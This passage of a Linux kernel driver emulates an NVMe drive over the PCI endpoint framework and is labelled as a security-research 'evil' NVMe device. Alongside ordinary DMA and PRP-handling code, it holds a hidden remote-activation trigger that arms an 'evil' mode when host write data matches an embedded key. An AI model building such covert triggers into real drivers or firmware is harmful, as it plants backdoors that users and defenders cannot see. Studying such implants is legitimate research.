// SPDX-License-Identifier: GPL-2.0
/*
 * eNVMe function driver for PCI Endpoint Framework for Security Research
 * Copyright (C) Rick Wertenbroek
 *               REDS, HEIG-VD, HES-SO
 *
 * Based on :
 * https://github.com/damien-lemoal/linux/blob/rock5b_ep_v17/drivers/pci/endpoint/functions/pci-epf-nvme.c
 * NVMe function driver for PCI Endpoint Framework
 *
 * Copyright (c) 2024, Western Digital Corporation or its affiliates.
 * Copyright (c) 2024, Rick Wertenbroek <rick.wertenbroek@gmail.com>
 *                     REDS Institute, HEIG-VD, HES-SO, Switzerland
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/delay.h>
#include <linux/dmaengine.h>
#include <linux/io.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/nvme.h>
#include <linux/pci_ids.h>
#include <linux/pci-epc.h>
#include <linux/pci-epf.h>
#include <linux/pci_regs.h>
#include <linux/slab.h>

/* Relative to linux include directory, for OoT build */
#include <../drivers/nvme/host/nvme.h>
#include <../drivers/nvme/host/fabrics.h>

/* Unique eNVMe activation key */
#define NVME_EVIL_ACTIVATION_KEY_LEN 256
static const u32 activation_key[NVME_EVIL_ACTIVATION_KEY_LEN] = {
	173,104,115,108,144, 88, 50, 76, 41,228,178, 51,145,254,156, 44,
	 99, 98, 58,140,233,176,165,109,134,  8,181, 95, 26, 43,107, 60,
	161, 61,246, 87, 78, 73, 57,215, 53,175,  7, 11,184, 77, 37,  2,
	148,200,205, 19,137, 66, 13,186, 93,236,248,111, 21,177,120,234,
	163, 65,  4,133,141,243,151,174,129, 74, 64,  0,195,157,216,162,
	235, 45,249,213, 22,155,247, 14, 32, 75, 67,183, 63,139,  1, 59,
	 20,113,136,138,187,154,223,189,193,110,225,101,203,222, 81,240,
	125, 72,238,204, 12, 55,231, 24,255,244,118, 17,152, 56, 97,116,
	 80,135, 79, 70, 42,250,114,159,209,207, 52,237,188,167, 71, 40,
	160, 36, 82,182,142,126, 38, 10,103, 49, 27,106,194,226,253, 68,
	206, 69,201,171,251, 34,218,  3,128,170,121,146, 96,150,  6, 85,
	 89,119,197,153, 86,202,  5,179, 91, 94,211,219,100,239, 35,217,
	224,149,105,196, 62, 90,117,191, 31,147,131,  9,185,230,158,166,
	199,232, 25,172,252, 46,242, 39,130,122,164,143, 48,124, 15,180,
	102,220,241,227,229,190,169,212,208, 33, 16, 28, 47,214, 18,123,
	245,198, 54,127,256, 23, 30,132, 92,210,192, 83,112, 84,221, 29,
};
/* eNVMe activation status */
static bool evil_activated = false;

/*
 * Maximum number of queue pairs: A higheer this number, the more mapping
 * windows of the PCI endpoint controller will be used. To avoid exceeding the
 * maximum number of mapping windows available (i.e. avoid PCI space mapping
 * failures) errors, the maximum number of queue pairs should be limited to
 * the number of mapping windows minus 2 (one window for IRQ issuing and one
 * window for data transfers) and divided by 2 (one mapping windows for the SQ
 * and one mapping window for the CQ).
 */
#define PCI_EPF_NVME_MAX_NR_QUEUES	16

/*
 * Default maximum data transfer size: limit to 128 KB to avoid
 * excessive local memory use for buffers.
 */
#define PCI_EPF_NVME_MDTS_KB		128
#define PCI_EPF_NVME_MAX_MDTS_KB	1024

/*
 * Queue flags.
 */
#define PCI_EPF_NVME_QUEUE_IS_SQ	(1U << 0)
#define PCI_EPF_NVME_QUEUE_LIVE		(1U << 1)

/* PRP manipulation macros */
#define pci_epf_nvme_prp_addr(ctrl, prp)	((prp) & ~(ctrl)->mps_mask)
#define pci_epf_nvme_prp_ofst(ctrl, prp)	((prp) & (ctrl)->mps_mask)
#define pci_epf_nvme_prp_size(ctrl, prp)	\
	((size_t)((ctrl)->mps - pci_epf_nvme_prp_ofst(ctrl, prp)))

static struct kmem_cache *epf_nvme_cmd_cache;

struct pci_epf_nvme;

/*
 * Host PCI memory segment for admin and IO commands.
 */
struct pci_epf_nvme_segment {
	phys_addr_t	pci_addr;
	size_t		size;
};

/*
 * Queue definition and mapping for the local PCI controller.
 */
struct pci_epf_nvme_queue {
	struct pci_epf_nvme	*epf_nvme;

	unsigned int		qflags;
	int			ref;

	phys_addr_t		pci_addr;
	size_t			pci_size;
	struct pci_epc_map	pci_map;

	u16			qid;
	u16			cqid;
	u16			size;
	u16			depth;
	u16			flags;
	u16			vector;
	u16			head;
	u16			tail;
	u16			phase;
	u32			db;

	size_t			qes;

	struct workqueue_struct	*cmd_wq;
	struct delayed_work	work;
	spinlock_t		lock;
	struct list_head	list;

	struct pci_epf_nvme_queue *sq;
};

/*
 * Local PCI controller exposed with the endpoint function.
 */
struct pci_epf_nvme_ctrl {
	/* Fabrics host controller */
	struct nvme_ctrl		*ctrl;

	/* Registers of the local PCI controller */
	void				*reg;
	u64				cap;
	u32				vs;
	u32				cc;
	u32				csts;
	u32				aqa;
	u64				asq;
	u64				acq;

	size_t				adm_sqes;
	size_t				adm_cqes;
	size_t				io_sqes;
	size_t				io_cqes;

	size_t				mps_shift;
	size_t				mps;
	size_t				mps_mask;

	size_t				mdts;

	unsigned int			nr_queues;
	struct pci_epf_nvme_queue	*sq;
	struct pci_epf_nvme_queue	*cq;

	struct workqueue_struct		*wq;
};

/*
 * Descriptor of commands sent by the host.
 */
struct pci_epf_nvme_cmd {
	struct list_head		link;
	struct pci_epf_nvme		*epf_nvme;

	int				sqid;
	int				cqid;
	unsigned int			status;
	struct nvme_ns			*ns;
	struct nvme_command		cmd;
	struct nvme_completion		cqe;

	/* Internal buffer that we will transfer over PCI */
	size_t				buffer_size;
	void				*buffer;
	enum dma_data_direction		dma_dir;

	/*
	 * Host PCI address segments: if nr_segs is 1, we use only "seg",
	 * otherwise, the segs array is allocated and used to store
	 * multiple segments.
	 */
	unsigned int			nr_segs;
	struct pci_epf_nvme_segment	seg;
	struct pci_epf_nvme_segment	*segs;

	struct work_struct		work;
	struct work_struct		evil_work;
};

/*
 * Structure for PCI character device
 */
struct pci_epf_nvme_cdev_data {
	struct pci_epf_nvme		*epf_nvme;
	struct cdev			cdev;
};


/*
 * EPF function private data representing our NVMe subsystem.
 */
struct pci_epf_nvme {
	struct pci_epf			*epf;
	const struct pci_epc_features	*epc_features;

	void				*reg_bar;
	void				*exp_rom;
	size_t				exp_rom_size;
	size_t				msix_table_offset;

	unsigned int			irq_type;
	unsigned int			nr_vectors;

	unsigned int			queue_count;

	struct pci_epf_nvme_ctrl	ctrl;
	bool				ctrl_enabled;

	__le64				*prp_list_buf;

	struct dma_chan			*dma_chan_tx;
	struct dma_chan			*dma_chan_rx;
	struct mutex			xfer_lock;

	struct mutex			irq_lock;

	struct delayed_work		reg_poll;

	struct workqueue_struct		*evil_wq;

	/* Function configfs attributes */
	struct config_group		group;
	char				*ctrl_opts_buf;
	bool				dma_enable;
	size_t				mdts_kb;

	bool				link_up;

	struct class			*char_class;
	struct pci_epf_nvme_cdev_data	chardev_data;
};

/*
 * Read a 32-bits BAR register (equivalent to readl()).
 */
static inline u32 pci_epf_nvme_reg_read32(struct pci_epf_nvme_ctrl *ctrl,
					  u32 reg)
{
	__le32 *ctrl_reg = ctrl->reg + reg;

	return le32_to_cpu(READ_ONCE(*ctrl_reg));
}

/*
 * Write a 32-bits BAR register (equivalent to writel()).
 */
static inline void pci_epf_nvme_reg_write32(struct pci_epf_nvme_ctrl *ctrl,
					    u32 reg, u32 val)
{
	__le32 *ctrl_reg = ctrl->reg + reg;

	WRITE_ONCE(*ctrl_reg, cpu_to_le32(val));
}

/*
 * Read a 64-bits BAR register (equivalent to lo_hi_readq()).
 */
static inline u64 pci_epf_nvme_reg_read64(struct pci_epf_nvme_ctrl *ctrl,
					  u32 reg)
{
	return (u64)pci_epf_nvme_reg_read32(ctrl, reg) |
		((u64)pci_epf_nvme_reg_read32(ctrl, reg + 4) << 32);
}

/*
 * Write a 64-bits BAR register (equivalent to lo_hi_writeq()).
 */
static inline void pci_epf_nvme_reg_write64(struct pci_epf_nvme_ctrl *ctrl,
					    u32 reg, u64 val)
{
	pci_epf_nvme_reg_write32(ctrl, reg, val & 0xFFFFFFFF);
	pci_epf_nvme_reg_write32(ctrl, reg + 4, (val >> 32) & 0xFFFFFFFF);
}

static inline bool pci_epf_nvme_ctrl_ready(struct pci_epf_nvme *epf_nvme)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;

	if (!epf_nvme->ctrl_enabled)
		return false;
	return (ctrl->cc & NVME_CC_ENABLE) && (ctrl->csts & NVME_CSTS_RDY);
}

struct pci_epf_nvme_dma_filter {
	struct device *dev;
	u32 dma_mask;
};

static bool pci_epf_nvme_dma_filter(struct dma_chan *chan, void *arg)
{
	struct pci_epf_nvme_dma_filter *filter = arg;
	struct dma_slave_caps caps;

	memset(&caps, 0, sizeof(caps));
	dma_get_slave_caps(chan, &caps);

	return chan->device->dev == filter->dev &&
		(filter->dma_mask & caps.directions);
}

static bool pci_epf_nvme_init_dma(struct pci_epf_nvme *epf_nvme)
{
	struct pci_epf *epf = epf_nvme->epf;
	struct device *dev = &epf->dev;
	struct pci_epf_nvme_dma_filter filter;
	struct dma_chan *chan;
	dma_cap_mask_t mask;

	mutex_init(&epf_nvme->xfer_lock);
	mutex_init(&epf_nvme->irq_lock);

	dma_cap_zero(mask);
	dma_cap_set(DMA_SLAVE, mask);

	filter.dev = epf->epc->dev.parent;
	filter.dma_mask = BIT(DMA_DEV_TO_MEM);

	chan = dma_request_channel(mask, pci_epf_nvme_dma_filter, &filter);
	if (!chan)
		goto generic;

	epf_nvme->dma_chan_rx = chan;

	filter.dma_mask = BIT(DMA_MEM_TO_DEV);
	chan = dma_request_channel(mask, pci_epf_nvme_dma_filter, &filter);
	if (!chan) {
		dma_release_channel(epf_nvme->dma_chan_rx);
		epf_nvme->dma_chan_rx = NULL;
		return false;
	}

	epf_nvme->dma_chan_tx = chan;

	dev_info(dev, "DMA RX channel %s, maximum segment size %u B\n",
		 dma_chan_name(epf_nvme->dma_chan_rx),
		 dma_get_max_seg_size(epf_nvme->dma_chan_rx->device->dev));
	dev_info(dev, "DMA TX channel %s, maximum segment size %u B\n",
		 dma_chan_name(epf_nvme->dma_chan_tx),
		 dma_get_max_seg_size(epf_nvme->dma_chan_tx->device->dev));

	return true;

generic:
	/* Fallback to a generic memcpy channel if we have one */
	dma_cap_zero(mask);
	dma_cap_set(DMA_MEMCPY, mask);
	chan = dma_request_chan_by_mask(&mask);
	if (IS_ERR(chan)) {
		if (PTR_ERR(chan) != -EPROBE_DEFER)
			dev_err(dev, "Failed to get generic DMA channel\n");
		return false;
	}

	dev_info(dev, "Generic DMA channel %s: maximum segment size %d B\n",
		 dma_chan_name(chan),
		 dma_get_max_seg_size(chan->device->dev));

	epf_nvme->dma_chan_tx = chan;
	epf_nvme->dma_chan_rx = chan;

	return true;
}

static void pci_epf_nvme_clean_dma(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);

	if (epf_nvme->dma_chan_tx)
		dma_release_channel(epf_nvme->dma_chan_tx);

	if (epf_nvme->dma_chan_rx != epf_nvme->dma_chan_tx)
		dma_release_channel(epf_nvme->dma_chan_rx);

	epf_nvme->dma_chan_tx = NULL;
	epf_nvme->dma_chan_rx = NULL;
}

static void pci_epf_nvme_dma_callback(void *param)
{
	complete(param);
}

static ssize_t pci_epf_nvme_dma_memcpy_transfer(struct pci_epf_nvme *epf_nvme,
					struct pci_epf_nvme_segment *seg,
					enum dma_data_direction dir, void *buf,
					phys_addr_t dma_addr)
{
	struct dma_chan *chan = epf_nvme->dma_chan_tx;
	struct pci_epf *epf = epf_nvme->epf;
	struct dma_async_tx_descriptor *desc;
	DECLARE_COMPLETION_ONSTACK(complete);
	struct device *dev = &epf->dev;
	dma_addr_t dma_dst, dma_src;
	struct pci_epc_map map;
	dma_cookie_t cookie;
	ssize_t ret;

	/* Map segment */
	ret = pci_epc_mem_map(epf->epc, epf->func_no, epf->vfunc_no,
			      seg->pci_addr, seg->size, &map);
	if (ret)
		return ret;

	if (dir == DMA_FROM_DEVICE) {
		dma_src = map.phys_addr;
		dma_dst = dma_addr;
	} else {
		dma_src = dma_addr;
		dma_dst = map.phys_addr;
	}

	desc = dmaengine_prep_dma_memcpy(chan, dma_dst, dma_src,
				map.pci_size, DMA_CTRL_ACK | DMA_PREP_INTERRUPT);
	if (!desc) {
		dev_err(dev, "Prepare DMA memcpy failed\n");
		ret = -EIO;
		goto unmap;
	}

	desc->callback = pci_epf_nvme_dma_callback;
	desc->callback_param = &complete;

	cookie = dmaengine_submit(desc);
	ret = dma_submit_error(cookie);
	if (ret) {
		dev_err(dev, "DMA submit failed %zd\n", ret);
		goto unmap;
	}

	dma_async_issue_pending(chan);
	ret = wait_for_completion_timeout(&complete, msecs_to_jiffies(1000));
	if (!ret) {
		dev_err(dev, "DMA transfer timeout\n");
		dmaengine_terminate_sync(chan);
		ret = -ETIMEDOUT;
		goto unmap;
	}

	ret = map.pci_size;

unmap:
	pci_epc_mem_unmap(epf->epc, epf->func_no, epf->vfunc_no, &map);

	return ret;
}

static ssize_t pci_epf_nvme_dma_private_transfer(struct pci_epf_nvme *epf_nvme,
					 struct pci_epf_nvme_segment *seg,
					 enum dma_data_direction dir, void *buf,
					 phys_addr_t dma_addr)
{
	struct pci_epf *epf = epf_nvme->epf;
	struct dma_async_tx_descriptor *desc;
	DECLARE_COMPLETION_ONSTACK(complete);
	struct dma_slave_config sconf = {};
	struct device *dev = &epf->dev;
	struct dma_chan *chan;
	dma_cookie_t cookie;
	int ret;

	switch (dir) {
	case DMA_FROM_DEVICE:
		chan = epf_nvme->dma_chan_rx;
		sconf.direction = DMA_DEV_TO_MEM;
		sconf.src_addr = seg->pci_addr;
		break;
	case DMA_TO_DEVICE:
		chan = epf_nvme->dma_chan_tx;
		sconf.direction = DMA_MEM_TO_DEV;
		sconf.dst_addr = seg->pci_addr;
		break;
	default:
		return -EINVAL;
	}

	ret = dmaengine_slave_config(chan, &sconf);
	if (ret) {
		dev_err(dev, "Failed to configure DMA channel\n");
		return ret;
	}

	desc = dmaengine_prep_slave_single(chan, dma_addr,
					   seg->size, sconf.direction,
					   DMA_CTRL_ACK | DMA_PREP_INTERRUPT);
	if (!desc) {
		dev_err(dev, "Failed to prepare DMA\n");
		return -EIO;
	}

	desc->callback = pci_epf_nvme_dma_callback;
	desc->callback_param = &complete;

	cookie = dmaengine_submit(desc);
	ret = dma_submit_error(cookie);
	if (ret) {
		dev_err(dev, "DMA submit failed %d\n", ret);
		return ret;
	}

	dma_async_issue_pending(chan);
	ret = wait_for_completion_timeout(&complete, msecs_to_jiffies(1000));
	if (!ret) {
		dev_err(dev, "DMA transfer timeout\n");
		dmaengine_terminate_sync(chan);
		return -ETIMEDOUT;
	}

	return seg->size;
}

static ssize_t pci_epf_nvme_dma_transfer(struct pci_epf_nvme *epf_nvme,
					 struct pci_epf_nvme_segment *seg,
					 enum dma_data_direction dir, void *buf)
{
	struct pci_epf *epf = epf_nvme->epf;
	struct device *dma_dev = epf->epc->dev.parent;
	phys_addr_t dma_addr;
	ssize_t ret;

	dma_addr = dma_map_single(dma_dev, buf, seg->size, dir);
	ret = dma_mapping_error(dma_dev, dma_addr);
	if (ret)
		return ret;

	if (epf_nvme->dma_chan_tx != epf_nvme->dma_chan_rx)
		ret = pci_epf_nvme_dma_private_transfer(epf_nvme, seg, dir,
							buf, dma_addr);
	else
		ret = pci_epf_nvme_dma_memcpy_transfer(epf_nvme, seg, dir,
						       buf, dma_addr);

	dma_unmap_single(dma_dev, dma_addr, seg->size, dir);

	return ret;
}

static ssize_t pci_epf_nvme_mmio_transfer(struct pci_epf_nvme *epf_nvme,
					  struct pci_epf_nvme_segment *seg,
					  enum dma_data_direction dir,
					  void *buf)
{
	struct pci_epf *epf = epf_nvme->epf;
	struct pci_epc_map map;
	int ret;

	/* Map segment */
	ret = pci_epc_mem_map(epf->epc, epf->func_no, epf->vfunc_no,
			      seg->pci_addr, seg->size, &map);
	if (ret)
		return ret;

	switch (dir) {
	case DMA_FROM_DEVICE:
		memcpy_fromio(buf, map.virt_addr, map.pci_size);
		ret = map.pci_size;
		break;
	case DMA_TO_DEVICE:
		memcpy_toio(map.virt_addr, buf, map.pci_size);
		ret = map.pci_size;
		break;
	default:
		ret = -EINVAL;
		break;
	}

	pci_epc_mem_unmap(epf->epc, epf->func_no, epf->vfunc_no, &map);

	return ret;
}

static int pci_epf_nvme_transfer(struct pci_epf_nvme *epf_nvme,
				 struct pci_epf_nvme_segment *seg,
				 enum dma_data_direction dir, void *buf)
{
	size_t size = seg->size;
	ssize_t ret;

	while (size) {
		/*
		 * Note: mmio transfers do not need serialization but this is a
		 * nice way to avoid using too many mapping windows.
		 */
		mutex_lock(&epf_nvme->xfer_lock);
		if (epf_nvme->dma_enable && size > SZ_4K)
			ret = pci_epf_nvme_dma_transfer(epf_nvme, seg,
							dir, buf);
		else
			ret = pci_epf_nvme_mmio_transfer(epf_nvme, seg,
							 dir, buf);
		mutex_unlock(&epf_nvme->xfer_lock);
		if (ret < 0)
			return ret;

		size -= ret;
		buf += ret;
	}

	return 0;
}

static const char *pci_epf_nvme_cmd_name(struct pci_epf_nvme_cmd *epcmd)
{
	u8 opcode = epcmd->cmd.common.opcode;

	if (epcmd->sqid)
		return nvme_get_opcode_str(opcode);
	return nvme_get_admin_opcode_str(opcode);
}

static inline struct pci_epf_nvme_cmd *
pci_epf_nvme_alloc_cmd(struct pci_epf_nvme *nvme)
{
	return kmem_cache_alloc(epf_nvme_cmd_cache, GFP_KERNEL);
}

static void pci_epf_nvme_exec_cmd_work(struct work_struct *work);
static void pci_epf_nvme_evil_work(struct work_struct *work);

static void pci_epf_nvme_init_cmd(struct pci_epf_nvme *epf_nvme,
				  struct pci_epf_nvme_cmd *epcmd,
				  int sqid, int cqid)
{
	memset(epcmd, 0, sizeof(*epcmd));
	INIT_LIST_HEAD(&epcmd->link);
	INIT_WORK(&epcmd->work, pci_epf_nvme_exec_cmd_work);
	INIT_WORK(&epcmd->evil_work, pci_epf_nvme_evil_work);
	epcmd->epf_nvme = epf_nvme;
	epcmd->sqid = sqid;
	epcmd->cqid = cqid;
	epcmd->status = NVME_SC_SUCCESS;
	epcmd->dma_dir = DMA_NONE;
}

static int pci_epf_nvme_alloc_cmd_buffer(struct pci_epf_nvme_cmd *epcmd)
{
	void *buffer;

	buffer = kmalloc(epcmd->buffer_size, GFP_KERNEL);
	if (!buffer) {
		epcmd->buffer_size = 0;
		return -ENOMEM;
	}

	if (!epcmd->sqid)
		memset(buffer, 0, epcmd->buffer_size);
	epcmd->buffer = buffer;

	return 0;
}

static int pci_epf_nvme_alloc_cmd_segs(struct pci_epf_nvme_cmd *epcmd,
				       int nr_segs)
{
	struct pci_epf_nvme_segment *segs;

	/* Single segment case: use the command embedded structure */
	if (nr_segs == 1) {
		epcmd->segs = &epcmd->seg;
		epcmd->nr_segs = 1;
		return 0;
	}

	/* More than one segment needed: allocate an array */
	segs = kcalloc(nr_segs, sizeof(struct pci_epf_nvme_segment), GFP_KERNEL);
	if (!segs)
		return -ENOMEM;

	epcmd->nr_segs = nr_segs;
	epcmd->segs = segs;

	return 0;
}

static void pci_epf_nvme_free_cmd(struct pci_epf_nvme_cmd *epcmd)
{
	if (epcmd->ns)
		nvme_put_ns(epcmd->ns);

	kfree(epcmd->buffer);

	if (epcmd->segs && epcmd->segs != &epcmd->seg)
		kfree(epcmd->segs);

	kmem_cache_free(epf_nvme_cmd_cache, epcmd);
}

static void pci_epf_nvme_complete_cmd(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct pci_epf_nvme_queue *cq;
	unsigned long flags;

	if (!pci_epf_nvme_ctrl_ready(epf_nvme)) {
		pci_epf_nvme_free_cmd(epcmd);
		return;
	}

	/*
	 * Add the command to the list of completed commands for the
	 * target cq and schedule the list processing.
	 */
	cq = &epf_nvme->ctrl.cq[epcmd->cqid];
	spin_lock_irqsave(&cq->lock, flags);
	list_add_tail(&epcmd->link, &cq->list);
	queue_delayed_work(epf_nvme->ctrl.wq, &cq->work, 0);
	spin_unlock_irqrestore(&cq->lock, flags);
}

static void pci_epf_nvme_evil_work(struct work_struct *work)
{
	struct pci_epf_nvme_cmd *epcmd =
		container_of(work, struct pci_epf_nvme_cmd, evil_work);
	struct device *dev = &epcmd->epf_nvme->epf->dev;
	int ret;

	/* Only check the hash on smaller transfers, remote activation should
	 * use a small write to activate, don't bother with large writes */
	if (epcmd->buffer_size <= SZ_128K) {
		/* Compare exactly, don't hash because of collisions */
		ret = memcmp(epcmd->buffer, activation_key,
			     NVME_EVIL_ACTIVATION_KEY_LEN);

		//print_hex_dump_bytes("", DUMP_PREFIX_ADDRESS, epcmd->buffer,
		//		     NVME_EVIL_ACTIVATION_KEY_LEN);

		if (!ret) {
			dev_info(dev, "evil: REMOTE ACTIVATION\n");
			evil_activated = true;
		}
	}

	pci_epf_nvme_free_cmd(epcmd);
}

static int pci_epf_nvme_transfer_cmd_data(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct pci_epf_nvme_segment *seg;
	void *buf = epcmd->buffer;
	size_t size = 0;
	int i, ret;

	/* Transfer each segment of the command */
	for (i = 0; i < epcmd->nr_segs; i++) {
		seg = &epcmd->segs[i];

		if (size >= epcmd->buffer_size) {
			dev_err(&epf_nvme->epf->dev, "Invalid transfer size\n");
			goto xfer_err;
		}

		ret = pci_epf_nvme_transfer(epf_nvme, seg, epcmd->dma_dir, buf);
		if (ret)
			goto xfer_err;

		buf += seg->size;
		size += seg->size;
	}

	return 0;

xfer_err:
	epcmd->status = NVME_SC_DATA_XFER_ERROR | NVME_STATUS_DNR;
	return -EIO;
}

static void pci_epf_nvme_raise_irq(struct pci_epf_nvme *epf_nvme,
				   struct pci_epf_nvme_queue *cq)
{
	struct pci_epf *epf = epf_nvme->epf;
	int ret;

	if (!(cq->qflags & NVME_CQ_IRQ_ENABLED))
		return;

	mutex_lock(&epf_nvme->irq_lock);

	switch (epf_nvme->irq_type) {
	case PCI_IRQ_MSIX:
	case PCI_IRQ_MSI:
		ret = pci_epc_raise_irq(epf->epc, epf->func_no, epf->vfunc_no,
					epf_nvme->irq_type, cq->vector + 1);
		if (!ret)
			break;
		/*
		 * If we got an error, it is likely because the host is using
		 * legacy IRQs (e.g. BIOS, grub).
		 */
		fallthrough;
	case PCI_IRQ_INTX:
		ret = pci_epc_raise_irq(epf->epc, epf->func_no, epf->vfunc_no,
					PCI_IRQ_INTX, 0);
		break;
	default:
		WARN_ON_ONCE(1);
		ret = -EINVAL;
		break;
	}

	if (ret)
		dev_err(&epf->dev, "Raise IRQ failed %d\n", ret);

	mutex_unlock(&epf_nvme->irq_lock);
}

/*
 * Transfer a prp list from the host and return the number of prps.
 */
static int pci_epf_nvme_get_prp_list(struct pci_epf_nvme *epf_nvme, u64 prp,
				     size_t xfer_len)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	size_t nr_prps = (xfer_len + ctrl->mps_mask) >> ctrl->mps_shift;
	struct pci_epf_nvme_segment seg;
	int ret;

	/*
	 * Compute the number of PRPs required for the number of bytes to
	 * transfer (xfer_len). If this number overflows the memory page size
	 * with the PRP list pointer specified, only return the space available
	 * in the memory page, the last PRP in there will be a PRP list pointer
	 * to the remaining PRPs.
	 */
	seg.pci_addr = prp;
	seg.size = min(pci_epf_nvme_prp_size(ctrl, prp), nr_prps << 3);
	ret = pci_epf_nvme_transfer(epf_nvme, &seg, DMA_FROM_DEVICE,
				    epf_nvme->prp_list_buf);
	if (ret)
		return ret;

	return seg.size >> 3;
}

static int pci_epf_nvme_cmd_parse_prp_list(struct pci_epf_nvme *epf_nvme,
					   struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct nvme_command *cmd = &epcmd->cmd;
	__le64 *prps = epf_nvme->prp_list_buf;
	struct pci_epf_nvme_segment *seg;
	size_t size = 0, ofst, prp_size, xfer_len;
	size_t transfer_len = epcmd->buffer_size;
	int nr_segs, nr_prps = 0;
	phys_addr_t pci_addr;
	int i = 0, ret;
	u64 prp;

	/*
	 * Allocate segments for the command: this considers the worst case
	 * scenario where all prps are discontiguous, so get as many segments
	 * as we can have prps. In practice, most of the time, we will have
	 * far less segments than prps.
	 */
	prp = le64_to_cpu(cmd->common.dptr.prp1);
	if (!prp)
		goto invalid_field;

	ofst = pci_epf_nvme_prp_ofst(ctrl, prp);
	nr_segs = (transfer_len + ofst + NVME_CTRL_PAGE_SIZE - 1)
		>> NVME_CTRL_PAGE_SHIFT;

	ret = pci_epf_nvme_alloc_cmd_segs(epcmd, nr_segs);
	if (ret)
		goto internal;

	/* Set the first segment using prp1 */
	seg = &epcmd->segs[0];
	seg->pci_addr = prp;
	seg->size = pci_epf_nvme_prp_size(ctrl, prp);

	size = seg->size;
	pci_addr = prp + size;
	nr_segs = 1;

	/*
	 * Now build the PCI address segments using the prp lists, starting
	 * from prp2.
	 */
	prp = le64_to_cpu(cmd->common.dptr.prp2);
	if (!prp)
		goto invalid_field;

	while (size < transfer_len) {
		xfer_len = transfer_len - size;

		if (!nr_prps) {
			/* Get the prp list */
			nr_prps = pci_epf_nvme_get_prp_list(epf_nvme, prp,
							    xfer_len);
			if (nr_prps < 0)
				goto internal;

			i = 0;
			ofst = 0;
		}

		/* Current entry */
		prp = le64_to_cpu(prps[i]);
		if (!prp)
			goto invalid_field;

		/* Did we reach the last prp entry of the list ? */
		if (xfer_len > ctrl->mps && i == nr_prps - 1) {
			/* We need more PRPs: prp is a list pointer */
			nr_prps = 0;
			continue;
		}

		/* Only the first prp is allowed to have an offset */
		if (pci_epf_nvme_prp_ofst(ctrl, prp))
			goto invalid_offset;

		if (prp != pci_addr) {
			/* Discontiguous prp: new segment */
			nr_segs++;
			if (WARN_ON_ONCE(nr_segs > epcmd->nr_segs))
				goto internal;

			seg++;
			seg->pci_addr = prp;
			seg->size = 0;
			pci_addr = prp;
		}

		prp_size = min_t(size_t, ctrl->mps, xfer_len);
		seg->size += prp_size;
		pci_addr += prp_size;
		size += prp_size;

		i++;
	}

	epcmd->nr_segs = nr_segs;
	ret = 0;

	if (size != transfer_len) {
		dev_err(&epf_nvme->epf->dev,
			"PRPs transfer length mismatch %zu / %zu\n",
			size, transfer_len);
		goto internal;
	}

	return 0;

internal:
	epcmd->status = NVME_SC_INTERNAL | NVME_STATUS_DNR;
	return -EINVAL;

invalid_offset:
	epcmd->status = NVME_SC_PRP_INVALID_OFFSET | NVME_STATUS_DNR;
	return -EINVAL;

invalid_field:
	epcmd->status = NVME_SC_INVALID_FIELD | NVME_STATUS_DNR;
	return -EINVAL;
}

static int pci_epf_nvme_cmd_parse_prp_simple(struct pci_epf_nvme *epf_nvme,
					     struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct nvme_command *cmd = &epcmd->cmd;
	size_t transfer_len = epcmd->buffer_size;
	int ret, nr_segs = 1;
	u64 prp1, prp2 = 0;
	size_t prp1_size;

	/* prp1 */
	prp1 = le64_to_cpu(cmd->common.dptr.prp1);
	prp1_size = pci_epf_nvme_prp_size(ctrl, prp1);

	/* For commands crossing a page boundary, we should have a valid prp2 */
	if (transfer_len > prp1_size) {
		prp2 = le64_to_cpu(cmd->common.dptr.prp2);
		if (!prp2)
			goto invalid_field;
		if (pci_epf_nvme_prp_ofst(ctrl, prp2))
			goto invalid_offset;
		if (prp2 != prp1 + prp1_size)
			nr_segs = 2;
	}

	/* Create segments using the prps */
	ret = pci_epf_nvme_alloc_cmd_segs(epcmd, nr_segs);
	if (ret)
		goto internal;

	epcmd->segs[0].pci_addr = prp1;
	if (nr_segs == 1) {
		epcmd->segs[0].size = transfer_len;
	} else {
		epcmd->segs[0].size = prp1_size;
		epcmd->segs[1].pci_addr = prp2;
		epcmd->segs[1].size = transfer_len - prp1_size;
	}

	return 0;

invalid_offset:
	epcmd->status = NVME_SC_PRP_INVALID_OFFSET | NVME_STATUS_DNR;
	return -EINVAL;

invalid_field:
	epcmd->status = NVME_SC_INVALID_FIELD | NVME_STATUS_DNR;
	return -EINVAL;

internal:
	epcmd->status = NVME_SC_INTERNAL | NVME_STATUS_DNR;
	return ret;
}

static int pci_epf_nvme_cmd_parse_dptr(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct nvme_command *cmd = &epcmd->cmd;
	u64 prp1 = le64_to_cpu(cmd->common.dptr.prp1);
	size_t ofst;
	int ret;

	if (epcmd->buffer_size > ctrl->mdts)
		goto invalid_field;

	/* We do not support SGL for now */
	if (epcmd->cmd.common.flags & NVME_CMD_SGL_ALL)
		goto invalid_field;

	/* Get PCI address segments for the command using its prps */
	ofst = pci_epf_nvme_prp_ofst(ctrl, prp1);
	if (ofst & 0x3)
		goto invalid_offset;

	if (epcmd->buffer_size + ofst <= NVME_CTRL_PAGE_SIZE * 2)
		ret = pci_epf_nvme_cmd_parse_prp_simple(epf_nvme, epcmd);
	else
		ret = pci_epf_nvme_cmd_parse_prp_list(epf_nvme, epcmd);
	if (ret)
		return ret;

	/* Get an internal buffer for the command */
	ret = pci_epf_nvme_alloc_cmd_buffer(epcmd);
	if (ret) {
		epcmd->status = NVME_SC_INTERNAL | NVME_STATUS_DNR;
		return ret;
	}

	return 0;

invalid_field:
	epcmd->status = NVME_SC_INVALID_FIELD | NVME_STATUS_DNR;
	return -EINVAL;

invalid_offset:
